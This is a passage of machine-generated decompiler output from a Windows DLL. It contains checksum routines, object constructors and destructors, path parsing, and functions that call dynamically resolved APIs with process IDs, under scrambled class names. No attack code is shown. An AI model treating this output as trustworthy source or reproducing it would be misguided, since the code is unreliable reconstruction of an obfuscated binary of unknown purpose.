          a2 += 16;
          --v39;
        }
        while ( v39 );
      }
      while ( v3 )
      {
        --v3;
        a1 += *a2++;
        v5 += a1;
      }
      a1 %= 0xFFF1u;
      v5 %= 0xFFF1u;
    }
  }
  v70 = v5;
  return a1 | (v70 << 16);
}
// 10039510: too many cbuild loops

//----- (100397A2) --------------------------------------------------------
int __usercall sub_100397A2@<eax>(int a1@<eax>, _BYTE *a2@<edx>, unsigned int a3)
{
  unsigned int i; // eax
  _DWORD *v4; // esi
  unsigned int v5; // eax
  _DWORD *v6; // esi
  unsigned int v7; // edx
  unsigned int v8; // eax
  unsigned int v9; // edx
  unsigned int v10; // eax
  unsigned int v11; // edx
  unsigned int v12; // eax
  unsigned int v13; // edx
  int v14; // edx
  bool v15; // zf
  unsigned int v17; // [esp+Ch] [ebp-4h]
  unsigned int v18; // [esp+Ch] [ebp-4h]

  for ( i = ~a1; a3; --a3 )
  {
    if ( ((unsigned __int8)a2 & 3) == 0 )
      break;
    i = dword_10090278[(unsigned __int8)(i ^ *a2++)] ^ (i >> 8);
  }
  v4 = a2;
  if ( a3 >= 0x20 )
  {
    v17 = a3 >> 5;
    do
    {
      v5 = *v4 ^ i;
      v6 = v4 + 1;
      v7 = *v6++ ^ dword_10090E78[(unsigned __int8)v5] ^ dword_10090278[HIBYTE(v5)] ^ dword_10090A78[BYTE1(v5)] ^ dword_10090678[BYTE2(v5)];
      v8 = *v6++ ^ dword_10090E78[(unsigned __int8)v7] ^ dword_10090278[HIBYTE(v7)] ^ dword_10090A78[BYTE1(v7)] ^ dword_10090678[BYTE2(v7)];
      v9 = *v6++ ^ dword_10090E78[(unsigned __int8)v8] ^ dword_10090278[HIBYTE(v8)] ^ dword_10090A78[BYTE1(v8)] ^ dword_10090678[BYTE2(v8)];
      v10 = *v6++ ^ dword_10090E78[(unsigned __int8)v9] ^ dword_10090278[HIBYTE(v9)] ^ dword_10090A78[BYTE1(v9)] ^ dword_10090678[BYTE2(v9)];
      v11 = *v6++ ^ dword_10090E78[(unsigned __int8)v10] ^ dword_10090278[HIBYTE(v10)] ^ dword_10090A78[BYTE1(v10)] ^ dword_10090678[BYTE2(v10)];
      v12 = *v6++ ^ dword_10090E78[(unsigned __int8)v11] ^ dword_10090278[HIBYTE(v11)] ^ dword_10090A78[BYTE1(v11)] ^ dword_10090678[BYTE2(v11)];
      a3 -= 32;
      v13 = *v6 ^ dword_10090E78[(unsigned __int8)v12] ^ dword_10090278[HIBYTE(v12)] ^ dword_10090A78[BYTE1(v12)] ^ dword_10090678[BYTE2(v12)];
      v4 = v6 + 1;
      i = dword_10090E78[(unsigned __int8)v13] ^ dword_10090278[HIBYTE(v13)] ^ dword_10090A78[BYTE1(v13)] ^ dword_10090678[BYTE2(v13)];
      --v17;
    }
    while ( v17 );
  }
  if ( a3 >= 4 )
  {
    v18 = a3 >> 2;
    do
    {
      a3 -= 4;
      v14 = dword_10090E78[(unsigned __int8)(*(_BYTE *)v4 ^ i)] ^ dword_10090278[(*v4 ^ i) >> 24] ^ dword_10090A78[(unsigned __int8)((unsigned __int16)(*(_WORD *)v4 ^ i) >> 8)] ^ dword_10090678[(unsigned __int8)((*v4 ^ i) >> 16)];
      ++v4;
      v15 = v18-- == 1;
      i = v14;
    }
    while ( !v15 );
  }
  for ( ; a3; --a3 )
  {
    i = dword_10090278[(unsigned __int8)(i ^ *(_BYTE *)v4)] ^ (i >> 8);
    v4 = (_DWORD *)((char *)v4 + 1);
  }
  return ~i;
}
// 10090278: using guessed type int dword_10090278[256];
// 10090678: using guessed type int dword_10090678[256];
// 10090A78: using guessed type int dword_10090A78[256];
// 10090E78: using guessed type int dword_10090E78[256];

//----- (10039C80) --------------------------------------------------------
int __fastcall sub_10039C80(unsigned int a1, _DWORD *a2)
{
  int result; // eax

  result = 0;
  while ( a1 )
  {
    if ( (a1 & 1) != 0 )
      result ^= *a2;
    a1 >>= 1;
    ++a2;
  }
  return result;
}

//----- (10039C95) --------------------------------------------------------
int __usercall sub_10039C95@<eax>(int *a1@<eax>, char *a2)
{
  int *v2; // esi
  char *v3; // edi
  int v4; // ebx
  int result; // eax

  v2 = a1;
  v3 = (char *)(a2 - (char *)a1);
  v4 = 32;
  do
  {
    result = sub_10039C80(*(int *)((char *)v2 + (_DWORD)v3), a2);
    *v2++ = result;
    --v4;
  }
  while ( v4 );
  return result;
}

//----- (10039D7C) --------------------------------------------------------
void *__cdecl sub_10039D7C(int a1, int a2, int a3)
{
  return malloc(a3 * a2);
}

//----- (10039D8F) --------------------------------------------------------
void __cdecl sub_10039D8F(int a1, void *Block)
{
  free(Block);
}

//----- (10039E1C) --------------------------------------------------------
int __cdecl sub_10039E1C(unsigned int a1)
{
  return (a1 >> 12) + a1 + (a1 >> 14) + 11;
}

//----- (10039E34) --------------------------------------------------------
_DWORD *__stdcall sub_10039E34(_DWORD *a1)
{
  sub_10016441(a1);
  *a1 = &off_100950FC;
  return a1;
}
// 100950FC: using guessed type int (__thiscall *off_100950FC)(void *Block, char);

//----- (10039E62) --------------------------------------------------------
_DWORD *__thiscall sub_10039E62(_DWORD *Block, char a2)
{
  sub_10039E81(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10039E81) --------------------------------------------------------
void __thiscall sub_10039E81(_DWORD *this)
{
  *this = &off_100950FC;
  sub_1001646C(this);
}
// 100950FC: using guessed type int (__thiscall *off_100950FC)(void *Block, char);

//----- (10039EA5) --------------------------------------------------------
_DWORD *__stdcall sub_10039EA5(_DWORD *a1)
{
  sub_10016441(a1);
  *a1 = &off_10095104;
  return a1;
}
// 10095104: using guessed type int (__thiscall *off_10095104)(void *Block, char);

//----- (10039ED3) --------------------------------------------------------
_DWORD *__thiscall sub_10039ED3(_DWORD *Block, char a2)
{
  sub_10039EF2(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10039EF2) --------------------------------------------------------
void __thiscall sub_10039EF2(_DWORD *this)
{
  *this = &off_10095104;
  sub_1001646C(this);
}
// 10095104: using guessed type int (__thiscall *off_10095104)(void *Block, char);

//----- (10039F16) --------------------------------------------------------
_DWORD *__stdcall sub_10039F16(_DWORD *a1)
{
  _DWORD *result; // eax
  int v2; // ecx

  result = a1;
  v2 = a1[1];
  *a1 = &off_10094ECC;
  *(_DWORD *)((char *)a1 + *(_DWORD *)(v2 + 4) + 4) = &off_10094ED0;
  return result;
}
// 10094ECC: using guessed type void (__noreturn *off_10094ECC)();
// 10094ED0: using guessed type int (__stdcall *off_10094ED0)(char);

//----- (10039F39) --------------------------------------------------------
int __thiscall sub_10039F39(_DWORD *this)
{
  int v1; // eax
  int result; // eax

  v1 = *(this - 1);
  *(this - 2) = &off_10094ECC;
  result = *(_DWORD *)(v1 + 4);
  *(_DWORD *)((char *)this + result - 4) = &off_10094ED0;
  return result;
}
// 10094ECC: using guessed type void (__noreturn *off_10094ECC)();
// 10094ED0: using guessed type int (__stdcall *off_10094ED0)(char);

//----- (10039F4F) --------------------------------------------------------
_DWORD *__stdcall sub_10039F4F(_DWORD *a1)
{
  int v1; // eax

  a1[1] = &unk_10094EEC;
  a1[2] = &unk_10094EF4;
  sub_10016441(a1 + 4);
  sub_10039F16(a1);
  sub_100167F9(a1 + 2, 0);
  v1 = a1[1];
  *a1 = &off_10094EE0;
  *(_DWORD *)((char *)a1 + *(_DWORD *)(v1 + 4) + 4) = &off_10094EE4;
  return a1;
}
// 10094EE0: using guessed type int (*off_10094EE0)();
// 10094EE4: using guessed type int (__stdcall *off_10094EE4)(char);

//----- (10039FBC) --------------------------------------------------------
int __thiscall sub_10039FBC(_DWORD *this)
{
  int v2; // ecx
  _DWORD *v3; // ecx
  int v4; // eax

  v2 = *(this - 3);
  *(this - 4) = &off_10094EE0;
  *(_DWORD *)((char *)this + *(_DWORD *)(v2 + 4) - 12) = &off_10094EE4;
  v3 = this - 2;
  v4 = this != (_DWORD *)16 ? (unsigned int)(this - 2) : 0;
  *(_DWORD *)(*(_DWORD *)(*(_DWORD *)v4 + 4) + v4) = &off_1009362C;
  return sub_10039F39(v3);
}
// 1009362C: using guessed type int (__stdcall *off_1009362C)(char);
// 10094EE0: using guessed type int (*off_10094EE0)();
// 10094EE4: using guessed type int (__stdcall *off_10094EE4)(char);

//----- (1003A011) --------------------------------------------------------
int __thiscall sub_1003A011(_DWORD *this)
{
  return this[3];
}

//----- (1003A015) --------------------------------------------------------
void __fastcall sub_1003A015(_DWORD *a1, int a2)
{
  int v3; // esi
  _DWORD *v5; // eax
  unsigned int v6; // ebx
  _DWORD *v7; // eax
  int v8; // esi
  _DWORD *v9; // eax
  int v10; // esi
  _DWORD *v11; // eax
  _DWORD *v12; // eax
  int *v13; // esi
  wint_t *v14; // eax
  wint_t v15; // ax
  int v16; // ecx
  _DWORD *v17; // eax
  int *v18; // esi
  int v19; // eax
  LPWSTR FilePart; // [esp+10h] [ebp-24Ch] BYREF
  int *v21; // [esp+14h] [ebp-248h]
  _DWORD *v22; // [esp+18h] [ebp-244h]
  _DWORD *v23; // [esp+1Ch] [ebp-240h]
  _DWORD *v24; // [esp+20h] [ebp-23Ch]
  int pExceptionObject; // [esp+24h] [ebp-238h] BYREF
  int v26[2]; // [esp+28h] [ebp-234h] BYREF
  _DWORD *v27; // [esp+30h] [ebp-22Ch]
  int *v28; // [esp+34h] [ebp-228h]
  _DWORD *v29; // [esp+38h] [ebp-224h]
  int v30; // [esp+3Ch] [ebp-220h] BYREF
  int v31; // [esp+40h] [ebp-21Ch] BYREF
  WCHAR Buffer[266]; // [esp+44h] [ebp-218h] BYREF
  int v33; // [esp+258h] [ebp-4h]

  v3 = (int)(a1 + 1);
  v29 = a1;
  *a1 = off_1009510C;
  v28 = a1 + 1;
  sub_10012A00(a1 + 1, word_100B6A2C);
  v33 = 5;
  v23 = a1 + 3;
  sub_10012A00(a1 + 3, word_100B6A30);
  v24 = a1 + 5;
  sub_10012A00(a1 + 5, word_100B6A34);
  v27 = a1 + 7;
  sub_10012A00(a1 + 7, word_100B6A38);
  v22 = a1 + 9;
  sub_10012A00(a1 + 9, word_100B6A3C);
  v21 = a1 + 12;
  sub_10012A00(a1 + 12, word_100B6A40);
  if ( !GetFullPathNameW(*(LPCWSTR *)(*(_DWORD *)(a2 + 4) + 12), 0x104u, Buffer, &FilePart) )
  {
    sub_100167F9(&pExceptionObject, 1);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  v5 = sub_10012A00(&v30, Buffer);
  LOBYTE(v33) = 6;
  sub_10002C25(v5 + 1, (int *)(v3 + 4));
  LOBYTE(v33) = 5;
  sub_10012AAC(&v30);
  v6 = sub_1000D88B(v3, 0x5Cu) + 1;
  v7 = sub_1000D2DE((int)v28, v6, v26, 0xFFFFFFFE);
  LOBYTE(v33) = 7;
  sub_10012A7C(&v30, (int)v7);
  LOBYTE(v33) = 8;
  v8 = (int)v27;
  sub_10002C25(&v31, v27 + 1);
  LOBYTE(v33) = 7;
  sub_10012AAC(&v30);
  LOBYTE(v33) = 5;
  sub_1000CE59(v26);
  v9 = sub_1000D2DE((int)v28, 0, v26, v6);
  LOBYTE(v33) = 9;
  sub_10012A7C(&v30, (int)v9);
  LOBYTE(v33) = 10;
  sub_10002C25(&v31, v22 + 1);
  LOBYTE(v33) = 9;
  sub_10012AAC(&v30);
  LOBYTE(v33) = 5;
  sub_1000CE59(v26);
  v10 = sub_1000D88B(v8, 0x2Eu);
  if ( v10 == -1 )
    v10 = *(_DWORD *)(v29[8] + 28);
  v11 = sub_1000D2DE((int)v27, 0, v26, v10);
  LOBYTE(v33) = 11;
  sub_10012A7C(&v30, (int)v11);
  LOBYTE(v33) = 12;
  sub_10002C25(&v31, v23 + 1);
  LOBYTE(v33) = 11;
  sub_10012AAC(&v30);
  LOBYTE(v33) = 5;
  sub_1000CE59(v26);
  v12 = sub_1000D2DE((int)v27, v10 + 1, v26, 0xFFFFFFFE);
  LOBYTE(v33) = 13;
  sub_10012A7C(&v30, (int)v12);
  LOBYTE(v33) = 14;
  sub_10002C25(&v31, v24 + 1);
  LOBYTE(v33) = 13;
  sub_10012AAC(&v30);
  LOBYTE(v33) = 5;
  sub_1000CE59(v26);
  v13 = v28;
  if ( *(_WORD *)sub_1000CF9F(v28, 1) == 58 )
  {
    v14 = (wint_t *)sub_1000CF9F(v13, 0);
    v15 = sub_10051B60(*v14);
    v16 = (int)v29;
    *((_WORD *)v29 + 23) = v15;
    *(_BYTE *)(v16 + 44) = 1;
  }
  else
  {
    v17 = sub_1000D2DE((int)v13, 2u, v26, 0xFFFFFFFE);
    LOBYTE(v33) = 15;
    sub_10012A7C(&v30, (int)v17);
    LOBYTE(v33) = 16;
    v18 = v21;
    sub_10002C25(&v31, v21 + 1);
    LOBYTE(v33) = 15;
    sub_10012AAC(&v30);
    LOBYTE(v33) = 5;
    sub_1000CE59(v26);
    v19 = sub_1000D869(0, (int)v18, 0x5Cu);
    sub_1000D7ED(v19, v18);
    *((_BYTE *)v29 + 44) = 0;
  }
  v33 = -1;
  sub_1006A5A7();
}
// 1009510C: using guessed type int (__thiscall *off_1009510C[2])(void *Block, char);
// 100B6A2C: using guessed type wchar_t word_100B6A2C[2];
// 100B6A30: using guessed type wchar_t word_100B6A30[2];
// 100B6A34: using guessed type wchar_t word_100B6A34[2];
// 100B6A38: using guessed type wchar_t word_100B6A38[2];
// 100B6A3C: using guessed type wchar_t word_100B6A3C[2];
// 100B6A40: using guessed type wchar_t word_100B6A40[2];

//----- (1003A382) --------------------------------------------------------
int *__thiscall sub_1003A382(int *Block, char a2)
{
  sub_1003A3A1(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1003A3A1) --------------------------------------------------------
LONG __thiscall sub_1003A3A1(int *this)
{
  *this = (int)off_1009510C;
  sub_10012AAC(this + 12);
  sub_10012AAC(this + 9);
  sub_10012AAC(this + 7);
  sub_10012AAC(this + 5);
  sub_10012AAC(this + 3);
  return sub_10012AAC(this + 1);
}
// 1009510C: using guessed type int (__thiscall *off_1009510C[2])(void *Block, char);

//----- (1003A409) --------------------------------------------------------
_DWORD *__stdcall sub_1003A409(int a1, _DWORD *a2)
{
  sub_1000CE26(a2, a1 + 4);
  return a2;
}

//----- (1003A43E) --------------------------------------------------------
_DWORD *__stdcall sub_1003A43E(int a1, _DWORD *a2)
{
  sub_1000CE26(a2, a1 + 28);
  return a2;
}

//----- (1003A473) --------------------------------------------------------
_DWORD *__stdcall sub_1003A473(int a1, _DWORD *a2)
{
  sub_1000CE26(a2, a1 + 12);
  return a2;
}

//----- (1003A4A8) --------------------------------------------------------
_DWORD *__stdcall sub_1003A4A8(int a1, _DWORD *a2)
{
  sub_1000CE26(a2, a1 + 20);
  return a2;
}

//----- (1003A4DD) --------------------------------------------------------
_DWORD *__stdcall sub_1003A4DD(int a1, _DWORD *a2)
{
  sub_1000CE26(a2, a1 + 36);
  return a2;
}

//----- (1003A53C) --------------------------------------------------------
_DWORD *__stdcall sub_1003A53C(int pExceptionObject, _DWORD *a2)
{
  if ( *(_BYTE *)(pExceptionObject + 44) )
  {
    sub_10016441(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  sub_1000CE26(a2, pExceptionObject + 48);
  return a2;
}

//----- (1003A58D) --------------------------------------------------------
_DWORD *__thiscall sub_1003A58D(void *this, _DWORD *a2, int a3, int a4)
{
  a2[2] = 0;
  a2[3] = 0;
  *a2 = &off_10095110;
  a2[1] = this;
  sub_1000CE26(a2 + 4, (int)&a3);
  sub_1000CE59(&a3);
  return a2;
}
// 10095110: using guessed type int (__thiscall *off_10095110)(void *Block, char);

//----- (1003A5D3) --------------------------------------------------------
int *__thiscall sub_1003A5D3(int *Block, char a2)
{
  sub_1003A5F2(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1003A5F2) --------------------------------------------------------
LONG __thiscall sub_1003A5F2(int *this)
{
  *this = (int)&off_10095110;
  return sub_1000CE59(this + 4);
}
// 10095110: using guessed type int (__thiscall *off_10095110)(void *Block, char);

//----- (1003A630) --------------------------------------------------------
_DWORD *__stdcall sub_1003A630(int a1, _DWORD *a2)
{
  sub_1000CE26(a2, a1 + 16);
  return a2;
}

//----- (1003A669) --------------------------------------------------------
_DWORD *__thiscall sub_1003A669(
        void *this,
        _DWORD *a2,
        int a3,
        int a4,
        int a5,
        int a6,
        int a7,
        int *a8,
        int *a9,
        int a10,
        int a11,
        int a12,
        int a13,
        int a14,
        int a15)
{
  int v15; // ecx
  int v16; // eax
  int v18; // [esp-1Ch] [ebp-38h] BYREF
  int v19; // [esp-18h] [ebp-34h]
  int v20; // [esp-14h] [ebp-30h] BYREF
  int v21; // [esp-10h] [ebp-2Ch]
  int v22; // [esp-Ch] [ebp-28h]
  int *v23; // [esp-8h] [ebp-24h]
  int *v24; // [esp-4h] [ebp-20h]
  int v25; // [esp+18h] [ebp-4h]

  v25 = 1;
  v24 = a9;
  v23 = a8;
  v22 = a7;
  v21 = (int)this;
  v20 = (int)this;
  a9 = &v20;
  sub_1000CE26(&v20, (int)&a5);
  LOBYTE(v25) = 2;
  v19 = v15;
  v18 = v15;
  a8 = &v18;
  sub_1000CE26(&v18, (int)&a3);
  LOBYTE(v25) = 1;
  sub_1003AEA6((int)a2, v18, v19, v20, v21, v22, (int)v23, (char)v24);
  a2[8] = a10;
  a2[9] = a11;
  a2[10] = a12;
  a2[11] = a13;
  a2[12] = a14;
  v16 = a15;
  *a2 = &off_10095118;
  a2[13] = v16;
  LOBYTE(v25) = 0;
  sub_1000CE59(&a3);
  v25 = -1;
  sub_1000CE59(&a5);
  return a2;
}
// 1003A69D: variable 'v15' is possibly undefined
// 10095118: using guessed type int (__thiscall *off_10095118)(void *Block, char);

//----- (1003A70C) --------------------------------------------------------
int *__thiscall sub_1003A70C(int *Block, char a2)
{
  sub_1003A72B(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1003A72B) --------------------------------------------------------
LONG __thiscall sub_1003A72B(int *this)
{
  *this = (int)&off_10095118;
  return sub_1003AF41(this);
}
// 10095118: using guessed type int (__thiscall *off_10095118)(void *Block, char);

//----- (1003A74F) --------------------------------------------------------
_DWORD *__thiscall sub_1003A74F(_DWORD *this, _DWORD *a2)
{
  int v2; // edx
  _DWORD *result; // eax
  int v4; // ecx

  v2 = this[8];
  result = a2;
  v4 = this[9];
  *a2 = v2;
  a2[1] = v4;
  return result;
}

//----- (1003A764) --------------------------------------------------------
_DWORD *__thiscall sub_1003A764(_DWORD *this, _DWORD *a2)
{
  int v2; // edx
  _DWORD *result; // eax
  int v4; // ecx

  v2 = this[10];
  result = a2;
  v4 = this[11];
  *a2 = v2;
  a2[1] = v4;
  return result;
}

//----- (1003A779) --------------------------------------------------------
_DWORD *__thiscall sub_1003A779(_DWORD *this, _DWORD *a2)
{
  int v2; // edx
  _DWORD *result; // eax
  int v4; // ecx

  v2 = this[12];
  result = a2;
  v4 = this[13];
  *a2 = v2;
  a2[1] = v4;
  return result;
}

//----- (1003A78E) --------------------------------------------------------
int __usercall sub_1003A78E@<eax>(int result@<eax>)
{
  *(_DWORD *)result = &off_1009513C;
  *(_DWORD *)(result + 4) = 0;
  *(_DWORD *)(result + 8) = 0;
  *(_BYTE *)(result + 12) = 0;
  *(_DWORD *)(result + 16) = 0;
  *(_DWORD *)(result + 20) = 0;
  return result;
}
// 1009513C: using guessed type int (__thiscall *off_1009513C)(void *Block, char);

//----- (1003A7A6) --------------------------------------------------------
_DWORD *__thiscall sub_1003A7A6(_DWORD *Block, char a2)
{
  *Block = &off_1009513C;
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 1009513C: using guessed type int (__thiscall *off_1009513C)(void *Block, char);

//----- (1003A7CD) --------------------------------------------------------
int __userpurge sub_1003A7CD@<eax>(int result@<eax>, int a2@<ecx>, int a3, char a4, int a5, int a6, char a7)
{
  *(_DWORD *)(result + 4) = a2;
  *(_DWORD *)(result + 8) = a3;
  *(_BYTE *)(result + 12) = a4;
  *(_DWORD *)(result + 16) = a5;
  *(_DWORD *)(result + 20) = a6;
  *(_DWORD *)result = &off_1009513C;
  *(_BYTE *)(result + 24) = a7;
  return result;
}
// 1009513C: using guessed type int (__thiscall *off_1009513C)(void *Block, char);

//----- (1003A826) --------------------------------------------------------
int __thiscall sub_1003A826(int this, int a2)
{
  int result; // eax

  result = this;
  if ( this != a2 )
  {
    *(_DWORD *)(this + 4) = *(_DWORD *)(a2 + 4);
    *(_DWORD *)(this + 8) = *(_DWORD *)(a2 + 8);
    *(_BYTE *)(this + 12) = *(_BYTE *)(a2 + 12);
    *(_DWORD *)(this + 16) = *(_DWORD *)(a2 + 16);
    *(_DWORD *)(this + 20) = *(_DWORD *)(a2 + 20);
    *(_BYTE *)(this + 24) = *(_BYTE *)(a2 + 24);
  }
  return result;
}

//----- (1003A85A) --------------------------------------------------------
int __thiscall sub_1003A85A(_DWORD *this)
{
  return this[1];
}

//----- (1003A85E) --------------------------------------------------------
int __thiscall sub_1003A85E(_DWORD *this)
{
  return this[2];
}

//----- (1003A862) --------------------------------------------------------
int __thiscall sub_1003A862(_DWORD *this)
{
  return this[5];
}

//----- (1003A866) --------------------------------------------------------
char __thiscall sub_1003A866(_BYTE *this)
{
  return this[24];
}

//----- (1003A86A) --------------------------------------------------------
int __thiscall sub_1003A86A(_BYTE *this)
{
  return this[12] & 1;
}

//----- (1003A872) --------------------------------------------------------
_DWORD *__thiscall sub_1003A872(int this, _DWORD *a2)
{
  _ThrowInfo *v3; // ecx
  int *v4; // eax
  int v5; // ecx
  char *v6; // ebx
  DWORD v7; // eax
  int v8; // eax
  int v9; // eax
  int v10; // eax
  void **v11; // eax
  _DWORD *v12; // eax
  int v14; // [esp-10h] [ebp-68h] BYREF
  int v15; // [esp-Ch] [ebp-64h]
  _ThrowInfo *v16; // [esp-8h] [ebp-60h] BYREF
  _ThrowInfo *CurrentProcessId; // [esp-4h] [ebp-5Ch]
  int v18[5]; // [esp+10h] [ebp-48h] BYREF
  int v19[3]; // [esp+24h] [ebp-34h] BYREF
  _ThrowInfo *v20; // [esp+30h] [ebp-28h]
  int v21; // [esp+38h] [ebp-20h] BYREF
  int *v22; // [esp+3Ch] [ebp-1Ch]
  int v23; // [esp+40h] [ebp-18h]
  int v24; // [esp+44h] [ebp-14h] BYREF
  int pExceptionObject[3]; // [esp+48h] [ebp-10h] BYREF
  int v26; // [esp+54h] [ebp-4h]

  v23 = 0;
  sub_10016983((void *)0x400, (int)v19, 0);
  v26 = 1;
  if ( (*(_DWORD *)(this + 20) & 0x100000) != 0 )
  {
    sub_1002EAEE(pExceptionObject);
    CurrentProcessId = (_ThrowInfo *)&_TI2_AVZdhrnpldcahnGvqzdhRnpldcahn_gfjjefwq_sr__;
    v4 = pExceptionObject;
    goto LABEL_3;
  }
  CurrentProcessId = v3;
  v16 = v3;
  pExceptionObject[0] = (int)&v16;
  sub_1000CE26(&v16, (int)&unk_100BF948);
  LOBYTE(v26) = 2;
  v15 = v5;
  v14 = v5;
  v22 = &v14;
  sub_1000CE26(&v14, (int)&unk_100BF940);
  LOBYTE(v26) = 1;
  v6 = sub_1002481B(v14, v15, (int)v16);
  CurrentProcessId = (_ThrowInfo *)GetCurrentProcessId();
  v7 = GetCurrentProcessId();
  sub_10029136(&v21, *(void **)(this + 4), 1, *(_DWORD *)(this + 8), v7, (int)CurrentProcessId);
  LOBYTE(v26) = 4;
  CurrentProcessId = 0;
  v16 = v20;
  v8 = sub_10016C00(v19);
  if ( ((int (__stdcall *)(int *, int, int, _ThrowInfo *, _ThrowInfo *))v6)(v22, 2, v8, v16, CurrentProcessId) < 0 )
  {
    CurrentProcessId = 0;
    v16 = v20;
    v9 = sub_10016C00(v19);
    v10 = ((int (__stdcall *)(int *, int, int, _ThrowInfo *, _ThrowInfo *))v6)(v22, 2, v9, v16, CurrentProcessId);
    sub_1002EA34(&v24, v10);
    CurrentProcessId = (_ThrowInfo *)&_TI2_AVEtKqstreari_gfjjefwq_sr__;
    v4 = &v24;
LABEL_3:
    _CxxThrowException(v4, CurrentProcessId);
  }
  v11 = (void **)sub_10016C24(v19);
  v12 = (_DWORD *)sub_10016983((void *)*(unsigned __int16 *)v11, (int)v18, v11[1]);
  LOBYTE(v26) = 5;
  sub_1000CCE5(v12, a2);
  v23 = 1;
  LOBYTE(v26) = 4;
  sub_10016B53(v18);
  LOBYTE(v26) = 1;
  sub_10014389(&v21);
  LOBYTE(v26) = 0;
  sub_10016B53(v19);
  return a2;
}
// 1003A8BB: variable 'v3' is possibly undefined
// 1003A8D1: variable 'v5' is possibly undefined
// 1003A872: using guessed type int var_34[3];
// 1003A872: using guessed type int var_48[5];

//----- (1003A9E6) --------------------------------------------------------
_DWORD *__thiscall sub_1003A9E6(int this, _DWORD *a2)
{
  _ThrowInfo *v3; // ecx
  int *v4; // eax
  int v5; // ecx
  DWORD v6; // eax
  int v7; // eax
  int v8; // eax
  int v9; // eax
  void **v10; // eax
  _DWORD *v11; // eax
  int v13; // [esp-10h] [ebp-6Ch] BYREF
  int v14; // [esp-Ch] [ebp-68h]
  _ThrowInfo *v15; // [esp-8h] [ebp-64h] BYREF
  _ThrowInfo *CurrentProcessId; // [esp-4h] [ebp-60h]
  int v17[5]; // [esp+10h] [ebp-4Ch] BYREF
  int v18[3]; // [esp+24h] [ebp-38h] BYREF
  _ThrowInfo *v19; // [esp+30h] [ebp-2Ch]
  _DWORD v20[2]; // [esp+38h] [ebp-24h] BYREF
  int v21; // [esp+40h] [ebp-1Ch] BYREF
  int *v22; // [esp+44h] [ebp-18h]
  int v23; // [esp+48h] [ebp-14h]
  int pExceptionObject[3]; // [esp+4Ch] [ebp-10h] BYREF
  int v25; // [esp+58h] [ebp-4h]

  v23 = 0;
  sub_10016983((void *)0x400, (int)v18, 0);
  v25 = 1;
  if ( (*(_DWORD *)(this + 20) & 0x100000) != 0 )
  {
    sub_1002EAEE(pExceptionObject);
    CurrentProcessId = (_ThrowInfo *)&_TI2_AVZdhrnpldcahnGvqzdhRnpldcahn_gfjjefwq_sr__;
    v4 = pExceptionObject;
    goto LABEL_3;
  }
  CurrentProcessId = v3;
  v15 = v3;
  pExceptionObject[0] = (int)&v15;
  sub_1000CE26(&v15, (int)&unk_100BF948);
  LOBYTE(v25) = 2;
  v14 = v5;
  v13 = v5;
  v22 = &v13;
  sub_1000CE26(&v13, (int)&unk_100BF940);
  LOBYTE(v25) = 1;
  pExceptionObject[0] = (int)sub_1002481B(v13, v14, (int)v15);
  CurrentProcessId = (_ThrowInfo *)GetCurrentProcessId();
  v6 = GetCurrentProcessId();
  sub_10029136(&v21, *(void **)(this + 4), 1, *(_DWORD *)(this + 8), v6, (int)CurrentProcessId);
  LOBYTE(v25) = 4;
  CurrentProcessId = 0;
  v15 = v19;
  v7 = sub_10016C00(v18);
  if ( ((int (__stdcall *)(int *, int, int, _ThrowInfo *, _ThrowInfo *))pExceptionObject[0])(
         v22,
         1,
         v7,
         v15,
         CurrentProcessId) < 0 )
  {
    CurrentProcessId = 0;
    v15 = v19;
    v8 = sub_10016C00(v18);
    v9 = ((int (__stdcall *)(int *, int, int, _ThrowInfo *, _ThrowInfo *))pExceptionObject[0])(
           v22,
           1,
           v8,
           v15,
           CurrentProcessId);
    sub_1002EA34(v20, v9);
    CurrentProcessId = (_ThrowInfo *)&_TI2_AVEtKqstreari_gfjjefwq_sr__;
    v4 = v20;
LABEL_3:
    _CxxThrowException(v4, CurrentProcessId);
  }
  v10 = (void **)sub_10016C24(v18);
  v11 = (_DWORD *)sub_10016983((void *)*(unsigned __int16 *)v10, (int)v17, v10[1]);
  LOBYTE(v25) = 5;
  sub_1000CCE5(v11, a2);
  v23 = 1;
  LOBYTE(v25) = 4;
  sub_10016B53(v17);
  LOBYTE(v25) = 1;
  sub_10014389(&v21);
  LOBYTE(v25) = 0;
  sub_10016B53(v18);
  return a2;
}
// 1003AA2E: variable 'v3' is possibly undefined
// 1003AA44: variable 'v5' is possibly undefined
// 1003A9E6: using guessed type int var_38[3];
// 1003A9E6: using guessed type _DWORD var_24[2];
// 1003A9E6: using guessed type int var_4C[5];

//----- (1003AB27) --------------------------------------------------------
char __thiscall sub_1003AB27(_ThrowInfo *this)
{
  int v1; // ecx
  int v2; // eax
  int *v3; // eax
  int v4; // eax
  int v5; // eax
  int **v6; // eax
  _DWORD *v7; // edi
  char v8; // bl
  _DWORD *v9; // esi
  _DWORD *v10; // eax
  char v11; // bl
  int v13; // [esp-10h] [ebp-68h] BYREF
  int v14; // [esp-Ch] [ebp-64h]
  _ThrowInfo *v15; // [esp-8h] [ebp-60h] BYREF
  _ThrowInfo *v16; // [esp-4h] [ebp-5Ch]
  int v17[5]; // [esp+10h] [ebp-48h] BYREF
  int v18[3]; // [esp+24h] [ebp-34h] BYREF
  _ThrowInfo *v19; // [esp+30h] [ebp-28h]
  int pExceptionObject[2]; // [esp+38h] [ebp-20h] BYREF
  int *v21; // [esp+40h] [ebp-18h] BYREF
  void *v22; // [esp+44h] [ebp-14h] BYREF
  bool v23; // [esp+4Bh] [ebp-Dh]
  int v24; // [esp+54h] [ebp-4h]

  if ( (dword_100BF9B8 & 1) == 0 )
  {
    dword_100BF9B8 |= 1u;
    v24 = 0;
    v16 = this;
    v15 = this;
    v21 = (int *)&v15;
    sub_1000CE26(&v15, (int)&unk_100BF948);
    LOBYTE(v24) = 1;
    v14 = v1;
    v13 = v1;
    pExceptionObject[1] = (int)&v13;
    sub_1000CE26(&v13, (int)&unk_100BF940);
